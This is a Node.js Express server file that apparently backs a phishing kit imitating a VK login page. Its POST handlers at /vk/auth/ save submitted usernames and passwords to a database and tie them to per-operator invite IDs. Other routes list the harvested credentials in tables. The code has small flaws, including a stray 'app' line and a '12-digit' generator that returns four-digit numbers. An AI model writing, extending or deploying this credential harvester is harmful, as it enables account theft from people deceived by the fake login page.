const {app, urlencodedParser} = require('./config')
const {InsertAccout, Select, Insert,Update, SelectAccount, Delete, SelectWhereID} = require('./database')
const port = process.env.PORT || 5000;

const generate12DigitNumber = () => {
    const min = 1000;
    const max = 9999;
    return Math.floor(Math.random() * (max - min + 1) + min);
  }

app.listen(80, () => console.log(`Listening on port 80`));

app.get('/', (req, res) => {
    res.render('index.ejs')
})


app.get('/vk/auth/', (req, res) => {
    res.render('vk.ejs')
})

app.get('/delete/:id', async (req, res) => {
    const id = req.params.id
    await Delete(id)
    res.redirect('/')
})

app.get('/invite/:id', async (req, res) => {
    const id = req.params.id
    const idk = await SelectWhereID(id)
    res.render('invite.ejs', {id:idk})
})

app.post('/vk/auth/', urlencodedParser, async (req, res) => {
    const login =  req.body.username
    const password =  req.body.password
    await Insert(0, login, password)
    res.redirect('/')
})

app.post('/vk/auth/:id', urlencodedParser, async (req, res) => {
    const id = req.params.id
    const login =  req.body.username
    const password =  req.body.password
    await Insert(id, login, password)
    await Update(id, 1)
    res.redirect('/')
})

app.get('/register/account', (req, res) => {
    res.render('create.ejs')
})

app.get('/all_account/',  async (req, res) => {
    res.render('tableAccount.ejs', {data:await SelectAccount()})
})

app

app.post('/register/account', urlencodedParser, async (req, res) => {
    const login =  req.body.login
    const id = generate12DigitNumber()
    await InsertAccout(id, login)
    res.send (
        {
            'id': id,
            'login': login
        }
    )
})

app.get('/check_forms/', async (req, res) => {
    const data = await Select()
    res.render('table.ejs', {args:data})
})

app.get('/vk/auth/:id', (req, res) => {
    res.render('vk.ejs')
})